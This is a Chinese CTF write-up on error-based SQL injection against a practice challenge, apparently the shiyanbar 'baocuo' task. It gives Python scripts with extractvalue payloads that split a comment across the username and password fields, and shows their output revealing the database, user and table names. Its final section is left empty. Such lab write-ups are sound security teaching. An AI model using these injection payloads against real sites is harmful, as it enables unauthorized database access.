# sql注入之报错注入——加了料的报错注入

0x01
===
<img src="http://wujiashuaitupiancunchu.oss-cn-shanghai.aliyuncs.com/jupyter_notebook_img/5wspylsy8c8.png" width="600px" />

[题目链接](http://ctf5.shiyanbar.com/web/baocuo/index.php)

0x02 解题
===
### 获取数据库名称
code
```python
import requests

data={'username':"'or extractvalue/*",
"password":"*/(1, concat(0x5c,(select database()))) or'"}
r = requests.post("http://ctf5.shiyanbar.com/web/baocuo/index.php",data=data)
r.encoding='utf-8'
print(r.text)
```
output
```shell
<br>XPATH syntax error: '\error_based_hpf'
```
### 获取用户名称
code
```python
import requests

data={'username':"'or extractvalue/*",
"password":"*/(1, concat(0x5c,(select user()))	) or'"}
r = requests.post("http://ctf5.shiyanbar.com/web/baocuo/index.php",data=data)
r.encoding='utf-8'
print(r.text)
```
output
```shell
<br>XPATH syntax error: '\web8@localhost'

```

### 获取所有数据表名称
code
```python
import requests
data={'username':"'or extractvalue/*",
"password":"*/(1, concat(0x5c,( select group_concat(table_name) from information_schema.tables where TABLE_SCHEMA regexp 'error_based_hpf'))) or'"}
r = requests.post("http://ctf5.shiyanbar.com/web/baocuo/index.php",data=data)
r.encoding='utf-8'
print(r.text)
```
output
```shell
<br>XPATH syntax error: '\ffll44jj,users'
```

### 获取所有字段 

```{.python .input}

```
